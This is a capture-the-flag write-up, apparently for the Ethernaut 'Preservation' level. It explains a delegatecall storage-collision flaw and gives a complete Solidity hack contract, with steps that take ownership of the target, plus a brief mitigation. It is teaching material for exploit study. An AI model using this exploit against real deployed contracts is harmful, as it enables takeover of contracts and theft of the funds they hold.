## Objectives

1. Claim ownership of the contract.

## Vulnerabilities

### Delegatecall

Calling into a contract with `delegatecall` gives full control over the the calling contract's storage values and balance. _Calling
into untrusted contracts is very dangerous._ Changing the address of the library instance to the address of our hack contract gives us
the ability to modify any storage values.

## Exploit

1. Write and deploy this hack contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationHack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    Preservation target;

    constructor(address _targetAddress){
        target = Preservation(_targetAddress);
    }

    function attack() public {
        target.setFirstTime(uint(uint160(address(this))));
    }

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

2. Call the `attack` function which will modify the first storage variable of the `Preservation` contract to the
   address of ths `hack` contract.

3. Call the `setFirstTime` function with any uint as input to modify the owner to the hack contract.

## Suggested mitigation

- Using stateless libraries prevent this type of exploit.
